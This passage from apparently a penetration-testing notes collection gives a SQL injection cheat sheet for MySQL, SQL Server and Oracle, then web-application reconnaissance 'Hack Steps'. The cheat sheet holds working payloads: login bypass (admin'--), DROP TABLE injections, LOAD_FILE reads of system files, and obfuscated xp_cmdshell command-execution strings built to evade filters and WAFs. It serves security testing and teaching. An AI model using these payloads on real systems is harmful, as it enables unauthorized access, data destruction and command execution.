to your queries it will not be in SQL Server logs (of course still will be in web server logs, try to use POST if it's possible)

Database Structure Queries
--------------------------

SQL Server (S)
^^^^^^^^^^^^^^

Getting User defined Tables

::

 SELECT name FROM sysobjects WHERE xtype = 'U'

Sysobjects table is the one that lists all the objects in the database and in our case we’re filtering that list by xtype “u” or user tables. 

Getting Column Names

::

 SELECT name FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'tablenameforcolumnnames')


MySQL (M)
^^^^^^^^^

Getting User defined Tables

::

 SELECT table_name FROM information_schema.tables WHERE table_schema = 'databasename'

Getting Column Names

::

 SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'tablename'

Oracle (O)
^^^^^^^^^^

Getting User defined Tables

::

 SELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'

Getting Column Names

::

 SELECT * FROM all_col_comments WHERE TABLE_NAME = 'TABLE'

Other Stuff
-----------

Line Comments
^^^^^^^^^^^^^^

Comments out rest of the query. Line comments are generally useful for ignoring rest of the query so you don't have to deal with fixing the syntax.

* \-\- (SM) 

  ::
   
   DROP sampletable;-- 

* # (M) 

 ::

  DROP sampletable;#

Line Comments Sample SQL Injection Attacks

* Username

 ::
 
  Username: admin'--

*
 ::

  SELECT * FROM members WHERE username = 'admin'--' AND password = 'password' 

 This is going to log you as admin user, because rest of the SQL query will be ignored.

Inline Comments
^^^^^^^^^^^^^^^
Comments out rest of the query by not closing them or you can use for bypassing blacklisting, removing spaces, obfuscating and determining database versions.

* /\*Comment Here\*/ (SM) 

 ::

  DROP/*comment*/sampletable
  DR/**/OP/*bypass blacklisting*/sampletable
  SELECT/*avoid-spaces*/password/**/FROM/**/Members

* /\*! MYSQL Special SQL \*/ (M) :

 This is a special comment syntax for MySQL. It's perfect for detecting MySQL version. If you put a code into this comments it's going to execute in MySQL only. Also you can use this to execute some code only if the server is higher than supplied version. 

 ::

  SELECT /*!32302 1/0, */ 1 FROM tablename


Classical Inline Comment SQL Injection Attack Samples

::

  ID: 10; DROP TABLE members /* Simply get rid of other stuff at the end the of query. Same as 10; DROP TABLE members --
  SELECT /\*!32302 1/0, \*/ 1 FROM tablename Will throw an divison by 0 error if MySQL version is higher than3.23.02

Stacking Queries
^^^^^^^^^^^^^^^^

Executing more than one query in one transaction. This is very useful in every injection point, especially in SQL Server back ended applications.

::

 ; (S) 
 
 SELECT * FROM members; DROP members-- : Ends a query and starts a new one.

Using Integers
^^^^^^^^^^^^^^

Very useful for bypassing, magic_quotes() and similar filters, or even WAFs.

::

 0xHEXNUMBER (SM) 

We can  write hex like these; 

::

 SELECT CHAR(0x66) (S) 
 SELECT 0x5045 (this is not an integer it will be a string from Hex) (M) 
 SELECT 0x50 + 0x45 (this is integer now!) (M)

String  Operations
^^^^^^^^^^^^^^^^^^

String related operations. These can be quite useful to build up injections which are not using any quotes, bypass any other black listing or determine back end database.

String Concatenation

* \+ (S) 

 ::

  SELECT login + '-' + password FROM members

* || (\*MO) 

 ::

  SELECT login || '-' || password FROM members

About MySQL "||"


If MySQL is running in ANSI mode it's going to work but otherwise MySQL accept it as logical operator it'll return 0. A better way to do it is using CONCAT() function in MySQL.

* CONCAT(str1, str2, str3, ...) (M) : Concatenate supplied strings. 

 ::

  SELECT CONCAT(login, password) FROM members


Strings without Quotes
^^^^^^^^^^^^^^^^^^^^^^

These are some direct ways to using strings but it's always possible to use CHAR()(MS) and CONCAT()(M) to generate string without quotes.

* 0x457578 (M) - Hex Representation of string 

 ::

  SELECT 0x457578 

 This will be selected as string in MySQL. 

 In MySQL easy way to generate hex representations of strings use this; 

 ::

  SELECT CONCAT('0x',HEX('c:\\boot.ini'))

* Using CONCAT() in MySQL 

 ::

  SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77)) (M) 
 This will return 'KLM'.

* Using CHAR()
  
 * 
  ::

   SELECT CHAR(75)+CHAR(76)+CHAR(77) (S)     This will return 'KLM'.
   SELECT CHR(75)||CHR(76)||CHR(77) (O)      This will return 'KLM'.
   SELECT (CHaR(75)||CHaR(76)||CHaR(77)) (P) This will return 'KLM'.

Hex based SQL Injection Samples

::

 SELECT LOAD_FILE(0x633A5C626F6F742E696E69) (M) This will show the content of c:\boot.ini

String Modification & Related

* ASCII() (SMP) Returns ASCII character value of leftmost character. A must have function for Blind SQL Injections. 

 ::

  SELECT ASCII('a')

* CHAR() (SM) Convert an integer of ASCII. 

 ::

  SELECT CHAR(64)

Filter Evasion
--------------

Scott Sutherland has written `SQL Injection: Death by Blacklist <https://blog.netspi.com/sql-injection-death-by-blacklist/>`_ 


* Standard SQL injection query using xp_cmdshell.

  ::

   ‘;exec xp_cmdshell ‘dir’;– 

* Using the escape character to bypass filters that replace ‘ with ‘ ‘.
  ::

   ‘;exec xp_cmdshell ‘dir’;– 

* Using upper and lower characters to bypass filters that are case sensitive. Note: The filtering may be case sensitive, but most SQL Server commands are not.

  ::

   ‘;exec xP_cMdsheLL ‘dir’;– 

* Using comments to avoid xp_cmdshell detection. Note: This method doesn’t work in SQL Server versions after 2000.

  ::

   ‘;ex/**/ec xp_cmds/**/hell ‘dir’;– 

* Using comments to avoid spaces. Note: This works with all versions of SQL Server.

 ::

  ‘;exec/**/xp_cmdshell/**/’dir’;– 

* Using concatenation to avoid xp_cmdshell detection.

  ::

   ‘;Declare @cmd as varchar(3000);Set @cmd = ‘x’+’p’+’_’+’c’+’m’+’d’+’s’+’h’+’e’+’l’+’l’+’/**/’+””+’d’+’i’+’r’+””;exec(@cmd);– 

* Using Base64 encoding to avoid xp_cmdshell detection.

  ::

   ‘;DECLARE @data varchar(max), @XmlData xml;SET @data = ‘ZXhlYyBtYXN0ZXIuLnhwX2NtZHNoZWxsICdkaXIn’;SET @XmlData = CAST(‘‘ + @data + ‘‘ as xml);SET @data = CONVERT(varchar(max), @XmlData.value(‘(data)[1]’, ‘varbinary(max)’));exec (@data);– 

* Using char function encoding to avoid xp_cmdshell detection. Note: Encoding of characters can be done with the SELECT ASCII(‘T’) query.
  ::

   Declare @cmd as varchar(3000);Set @cmd =(CHAR(101)+CHAR(120)+CHAR(101)+CHAR(99)+CHAR(32)+CHAR(109)+CHAR(97)+CHAR(115)+CHAR(116)+CHAR(101)+CHAR(114)+CHAR(46)+CHAR(46)+CHAR(120)+CHAR(112)+CHAR(95)+CHAR(99)+CHAR(109)+CHAR(100)+CHAR(115)+CHAR(104)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(32)+CHAR(39)+CHAR(100)+CHAR(105)+CHAR(114)+CHAR(39)+CHAR(59));EXEC(@cmd);– 

* Using Unicode nchar function encoding to avoid xp_cmdshell detection. Note: Unicode character encoding can be done with the SELECT UNICODE(‘a’); query.

  ::

   Declare @cmd as nvarchar(3000);Set @cmd =(nchar(101)+nchar(120)+nchar(101)+nchar(99)+nchar(32)+nchar(109)+nchar(97)+nchar(115)+nchar(116)+nchar(101)+nchar(114)+nchar(46)+nchar(46)+nchar(120)+nchar(112)+nchar(95)+nchar(99)+nchar(109)+nchar(100)+nchar(115)+nchar(104)+nchar(101)+nchar(108)+nchar(108)+nchar(32)+nchar(39)+nchar(100)+nchar(105)+nchar(114)+nchar(39)+nchar(59));EXEC(@cmd);– 

* Using binary encoded ascii, and the CAST function to avoid xp_cmdshell detection. Note: Binary encoding can be done with the SELECT CAST(‘query’ as binary); query.

  ::

   ‘;Declare @cmd as varchar(3000);Set @cmd = Ncast(0x78705F636D647368656C6C202764697227 as varchar(3000));exec(@cmd);– 

* Using binary encoded ascii, and the CONVERT function to avoid xp_cmdshell and CAST detection. Note: Binary encoding can be done with the SELECT CONVERT (binary,’query’ ); query.

  ::

   ‘;Declare @cmd as varchar(3000);Set @cmd = convert(varchar(0),0x78705F636D647368656C6C202764697227);exec(@cmd);– 
  
* Using sp_sqlexec to avoid EXEC() detection

  ::

   ‘;Declare @cmd as varchar(3000);Set @cmd = convert(varchar(0),0x78705F636D647368656C6C202764697227);exec sp_sqlexec @cmd;– 

Evading user input filters whilst trying to exploit SQL injection is often a case of trying to format the same payloads but with different characters. Take the following payload for example:

::

 ' AND 3>2 --

We could rewrite this payload in a number of ways depending on which part of the payload was being filtered, for example with the greater-than sign, We could replace it using an encoded character:

::

 ' AND 3%3E2 --
 ' AND 3%253E2 --
 ' AND 3%u003e2 --

Alternatively we could simply reformat the payload to achieve the same result, such as:

::

 ' AND 2<3 --
 ' AND 2<>3 --
 ' AND 2!=3 -- ' ' ' ' ' ' '

**Legend**

::

 M : MySQL
 S : SQL Server
 P : PostgreSQL
 O : Oracle
 + : Possibly all other databases


Appendix-VIII Hack Steps 
========================

Mapping the Application
-----------------------

HACK STEPS

1. Configure your browser to use either Burp or WebScarab as a local proxy (see Chapter 20 for specific details about how to do this if you’re unsure). 
2. Browse the entire application normally, attempting to visit every link/URL you discover, submitting every form, and proceeding through all multistep functions to completion. Try browsing with JavaScript enabled and disabled, and with cookies enabled and disabled. Many applications can handle various browser configurations, and you may reach different content and code paths within the application. 
3. Review the site map generated by the proxy/spider tool, and identify any application content or functions that you did not browse manually. Establish how the spider enumerated each item. For example, in Burp Spider, check the Linked From details. Using your browser, access the item manually so that the response from the server is parsed by the proxy/spider tool to identify any further content. Continue this step recursively until no further content or functionality is identified. 
4. Optionally, tell the tool to actively spider the site using all of the already enumerated content as a starting point. To do this, first identify any URLs that are dangerous or likely to break the application session, and configure the spider to exclude these from its scope. Run the spider and review the results for any additional content it discovers. 

The site map generated by the proxy/spider tool contains a wealth of information about the target application, which will be useful later in identifying the various attack surfaces exposed by the application.


HACK STEPS

1. Make some manual requests for known valid and invalid resources, and identify how the server handles the latter. 
2. Use the site map generated through user-directed spidering as a basis for automated discovery of hidden content. 
3. Make automated requests for common filenames and directories within each directory or path known to exist within the application. Use Burp Intruder or a custom script, together with wordlists of common files and directories, to quickly generate large numbers of requests. If you have identified a particular way in which the application handles requests for invalid resources (such as a customized “file not found” page), configure Intruder or your script to highlight these results so that they can be ignored. 
4. Capture the responses received from the server, and manually review them to identify valid resources. 
5. Perform the exercise recursively as new content is discovered.


HACK STEPS

1. Review the results of your user-directed browsing and basic brute-force exercises. Compile lists of the names of all enumerated subdirectories, file stems, and file extensions. 
2. Review these lists to identify any naming schemes in use. For example, if there are pages called AddDocument.jsp and ViewDocument.jsp, there may also be pages called EditDocument.jsp and RemoveDocument.jsp. You can often get a feel for developers’ naming habits just by reading a few examples. For example, depending on their personal style, developers may be verbose (AddANewUser.asp), succinct (AddUser.asp), use abbreviations (AddUsr.asp), or even be more cryptic (AddU.asp). Getting a feel for the naming styles in use may help you guess the precise names of content you have not already identified. 
3. Sometimes, the naming scheme used for different content employs identifiers such as numbers and dates, which can make inferring hidden content easy. This is most commonly encountered in the names of static resources, rather than dynamic scripts. For example, if a company’s website links to AnnualReport2009.pdf and AnnualReport2010.pdf, it should be a short step to identifying what the next report will be called. Somewhat incredibly, there have been notorious cases of companies placing files containing financial reports on their web servers before they were publicly announced, only to have wily journalists discover them based on the naming scheme used in earlier years. 
4. Review all client-side code such as HTML and JavaScript to identify any clues about hidden server-side content. These may include HTML comments related to protected or unlinked functions, HTML forms with disabled SUBMIT elements, and the like. Often, comments are automatically generated by the software that has been used to generate web content, or by the platform on which the application is running. References to items such as server-side include files are of particular interest. These files may actually be publicly downloadable and may contain highly sensitive information such as database connection strings and passwords. In other cases, developers’ comments may contain all kinds of useful tidbits, such as database names, references to back-end components, SQL query strings, and so on. Thick-client components such as Java applets and ActiveX controls may also contain sensitive data that you can extract
5. Add to the lists of enumerated items any further potential names conjectured on the basis of the items that you have discovered. Also add to the file extension list common extensions such as txt, bak, src, inc, and old, which may uncover the source to backup versions of live pages. Also add extensions associated with the development languages in use, such as .java and .cs, which may uncover source files that have been compiled into live pages. (See the tips later in this chapter for identifying technologies in use.) 
6. Search for temporary files that may have been created inadvertently by developer tools and file editors. Examples include the .DS_Store file, which contains a directory index under OS X, file.php~1, which is a temporary file created when file.php is edited, and the .tmp file extension that is used by numerous software tools. 
7. Perform further automated exercises, combining the lists of directories, file stems, and file extensions to request large numbers of potential resources. For example, in a given directory, request each file stem combined with each file extension. Or request each directory name as a subdirectory of every known directory. 
8. Where a consistent naming scheme has been identified, consider performing a more focused brute-force exercise. For example, if AddDocument .jsp and ViewDocument.jsp are known to exist, you may create a list of actions (edit, delete, create) and make requests of the form XxxDocument.jsp. Alternatively, create a list of item types (user, account, file) and make requests of the form AddXxx.jsp. 
9. Perform each exercise recursively, using new enumerated content and patterns as the basis for further user-directed spidering and further automated content discovery. You are limited only by your imagination, time available, and the importance you attach to discovering hidden content within the application you are targeting.

HACK STEPS

1. Use several different search engines and web archives (listed previously) to discover what content they indexed or stored for the application you are attacking. 
2. When querying a search engine, you can use various advanced techniques to maximize the effectiveness of your research. The following suggestions apply to Google. You can find the corresponding queries on other engines by selecting their Advanced Search option. n site:www.wahh-target.com returns every resource within the target site that Google has a reference to. n site:www.wahh-target.com login returns all the pages containing the expression login. In a large and complex application, this technique can be used to quickly home in on interesting resources, such as site maps, password reset functions, and administrative menus. n link:www.wahh-target.com returns all the pages on other websites and applications that contain a link to the target. This may include links to old content, or functionality that is intended for use only by third parties, such as partner links. n related:www.wahh-target.com returns pages that are “similar” to the target and therefore includes a lot of irrelevant material. However, it may also discuss the target on other sites, which may be of interest. 
3. Perform each search not only in the default Web section of Google, but also in Groups and News, which may contain different results. 
4. Browse to the last page of search results for a given query, and select Repeat the Search with the Omitted Results Included. By default, Google attempts to filter out redundant results by removing pages that it believes are sufficiently similar to others included in the results. Overriding this behavior may uncover subtly different pages that are of interest to you when attacking the application. 
5. View the cached version of interesting pages, including any content that is no longer present in the actual application. In some cases, search engine caches contain resources that cannot be directly accessed in the application without authentication or payment.
6. Perform the same queries on other domain names belonging to the same organization, which may contain useful information about the application you are targeting. If your research identiﬁ es old content and functionality that is no longer linked to within the main application, it may still be present and usable. The old functionality may contain vulnerabilities that do not exist elsewhere within the application. Even where old content has been removed from the live application, the content obtained from a search engine cache or web archive may contain references to or clues about other functionality that is still present within the live application and that can be used to attack it.

HACK STEPS

1. Compile a list containing every name and e-mail address you can discover relating to the target application and its development. This should include any known developers, names found within HTML source code, names found in the contact information section of the main company website, and any names disclosed within the application itself, such as administrative staff. 
2. Using the search techniques described previously, search for each identified name to find any questions and answers they have posted to Internet forums. Review any information found for clues about functionality or vulnerabilities within the target application.

HACK STEPS

Several useful options are available when you run Nikto: 

1. If you believe that the server is using a nonstandard location for interesting content that Nikto checks for (such as /cgi/cgi-bin instead of /cgi-bin), you can specify this alternative location using the option –root /cgi/. For the specific case of CGI directories, these can also be specified using the option –Cgidirs. 
2. If the site uses a custom “file not found” page that does not return the HTTP 404 status code, you can specify a particular string that identifies this page by using the -404 option. 
3. Be aware that Nikto does not perform any intelligent verification of potential issues and therefore is prone to report false positives. Always check any results Nikto returns manually. 
   
Note that with tools like Nikto, you can specify a target application using its domain name or IP address. If a tool accesses a page using its IP address, the tool treats links on that page that use its domain name as belonging to a different domain, so the links are not followed. This is reasonable, because some applications are virtually hosted, with multiple domain names sharing the same IP address. Ensure that you conﬁ gure your tools with this fact in mind.


HACK STEPS

1. Identify any instances where application functionality is accessed not by requesting a specific page for that function (such as /admin/editUser.jsp) but by passing the name of a function in a parameter (such as /admin.jsp?action=editUser). 
2. Modify the automated techniques described for discovering URL-specified content to work on the content-access mechanisms in use within the application. For example, if the application uses parameters that specify servlet and method names, first determine its behavior when an invalid servlet and/or method is requested, and when a valid method is requested with other invalid parameters. Try to identify attributes of the server’s responses that indicate “hits” — valid servlets and methods. If possible, find a way of attacking the problem in two stages, first enumerating servlets and then methods within these. Using a method similar to the one used for URL-specified content, compile lists of common items, add to these by inferring from the names actually observed, and generate large numbers of requests based on these. 
3. If applicable, compile a map of application content based on functional paths, showing all the enumerated functions and the logical paths and dependencies between them.


HACK STEPS

1. Using lists of common debug parameter names (debug, test, hide, source, etc.) and common values (true, yes, on, 1, etc.), make a large number of requests to a known application page or function, iterating through all permutations of name and value. For POST requests, insert the added parameter to both the URL query string and the message body. Burp Intruder can be used to perform this test using multiple payload sets and the “cluster bomb” attack type (see Chapter 14 for more details).
2. Monitor all responses received to identify any anomalies that may indicate that the added parameter has had an effect on the application’s processing. 
3. Depending on the time available, target a number of different pages or functions for hidden parameter discovery. Choose functions where it is most likely that developers have implemented debug logic, such as login, search, and file uploading and downloading.

HACK STEPS

1. Identify all entry points for user input, including URLs, query string parameters, POST data, cookies, and other HTTP headers processed by the application. 
2. Examine the query string format used by the application. If it does not employ the standard format described in Chapter 
3, try to understand how parameters are being transmitted via the URL. Virtually all custom schemes still employ some variation on the name/value model, so try to understand how name/value pairs are being encapsulated into the nonstandard URLs you have identified. 3. Identify any out-of-bound channels via which user-controllable or other third-party data is being introduced into the application’s processing. 
4. View the HTTP Server banner returned by the application. Note that in some cases, different areas of the application are handled by different back-end components, so different Server headers may be received. 
6. Check for any other software identifiers contained within any custom HTTP headers or HTML source code comments. 
7. Run the httprint tool to fingerprint the web server. 
8. If fine-grained information is obtained about the web server and other components, research the software versions in use to identify any vulnerabilities that may be exploited to advance an attack (see Chapter 18). 
9. Review your map of application URLs to identify any interesting-looking file extensions, directories, or other sub-sequences that may provide clues about the technologies in use on the server. 
10. Review the names of all session tokens issued by the application to identify the technologies being used. 
11. Use lists of common technologies, or Google, to establish which technologies may be in use on the server, or discover other websites and applications that appear to employ the same technologies. 
12. Perform searches on Google for the names of any unusual cookies, scripts, HTTP headers, and the like that may belong to third-party software components. If you locate other applications in which the same components are being used, review these to identify any additional functionality and parameters that the components support, and verify whether these are also present in your target application. Note that third-party components may look and feel quite different in each implementation, due to branding customizations, but the core functionality, including script and parameter names, is often the same. If possible, download and install the component and analyze it to fully understand its capabilities and, if possible, discover any vulnerabilities. Consult repositories of known vulnerabilities to identify any known defects with the component in question.

HACK STEPS

1. Review the names and values of all parameters being submitted to the application in the context of the functionality they support. 
2. Try to think like a programmer, and imagine what server-side mechanisms and technologies are likely to have been used to implement the behavior you can observe.

HACK STEPS

1. Try to identify any locations within the application that may contain clues about the internal structure and functionality of other areas. 
2. It may not be possible to draw any firm conclusions here; however, the cases identified may prove useful at a later stage of the attack when you’re attempting to exploit any potential vulnerabilities.

HACK STEPS

1. Make a note of any functionality that diverges from the standard GUI appearance, parameter naming, or navigation mechanism used within the rest of the application. 
2. Also make a note of functionality that is likely to have been added retrospectively. Examples include debug functions, CAPTCHA controls, usage tracking, and third-party code. 
3. Perform a full review of these areas, and do not assume that the standard defenses used elsewhere in the application apply.

HACK STEPS

1. Understand the core functionality implemented within the application and the main security mechanisms in use. 
2. Identify all features of the application’s functionality and behavior that are often associated with common vulnerabilities. 
3. Check any third-party code against public vulnerability databases such as www.osvdb.org to determine any known issues. 
4. Formulate a plan of attack, prioritizing the most interesting-looking functionality and the most serious of the associated potential vulnerabilities.

Bypassing Client-Side Controls
------------------------------

HACK STEPS

1. Locate all instances within the application where hidden form fields, cookies, and URL parameters are apparently being used to transmit data via the client. 
2. Attempt to determine or guess the role that the item plays in the application’s logic, based on the context in which it appears and on clues such as the parameter’s name. 
3. Modify the item’s value in ways that are relevant to its purpose in the application. Ascertain whether the application processes arbitrary values submitted in the parameter, and whether this exposes the application to any vulnerabilities.

HACK STEPS

Faced with opaque data being transmitted via the client, several avenues of attack are possible: 

1. If you know the value of the plaintext behind the opaque string, you can attempt to decipher the obfuscation algorithm being employed. 
2. As described in Chapter 4, the application may contain functions elsewhere that you can leverage to return the opaque string resulting from a piece of plaintext you control. In this situation, you may be able to directly obtain the required string to deliver an arbitrary payload to the function you are targeting. 
3. Even if the opaque string is impenetrable, it may be possible to replay its value in other contexts to achieve a malicious effect. For example, the pricing_token parameter in the previously shown form may contain an encrypted version of the product’s price. Although it is not possible to produce the encrypted equivalent for an arbitrary price of your choosing, you may be able to copy the encrypted price from a different, cheaper product and submit this in its place. 
4. If all else fails, you can attempt to attack the server-side logic that will decrypt or deobfuscate the opaque string by submitting malformed variations of it — for example, containing overlong values, different character sets, and the like


HACK STEPS


1. If you are attacking an ASP.NET application, verify whether MAC protection is enabled for the ViewState. This is indicated by the presence of a 20-byte hash at the end of the ViewState structure, and you can use the ViewState parser in Burp Suite to confirm whether this is present. 
2. Even if the ViewState is protected, use Burp to decode the ViewState on various application pages to discover whether the application is using the ViewState to transmit any sensitive data via the client. 
3. Try to modify the value of a specific parameter within the ViewState without interfering with its structure, and see whether an error message results. 
4. If you can modify the ViewState without causing errors, you should review the function of each parameter within the ViewState and see whether the application uses it to store any custom data. Try to submit crafted values as each parameter to probe for common vulnerabilities, as you would for any other item of data being transmitted via the client. 
5. Note that MAC protection may be enabled or disabled on a per-page basis, so it may be necessary to test each significant page of the application for ViewState hacking vulnerabilities. If you are using Burp Scanner with passive scanning enabled, Burp automatically reports any pages that use the ViewState without MAC protection enabled.


HACK STEPS

1. Look for form elements containing a maxlength attribute. Submit data that is longer than this length but that is formatted correctly in other respects (for example, it is numeric if the application expects a number). 
2. If the application accepts the overlong data, you may infer that the clientside validation is not replicated on the server. 
3. Depending on the subsequent processing that the application performs on the parameter, you may be able to leverage the defects in validation to exploit other vulnerabilities, such as SQL injection, cross-site scripting, or buffer overflows.


     




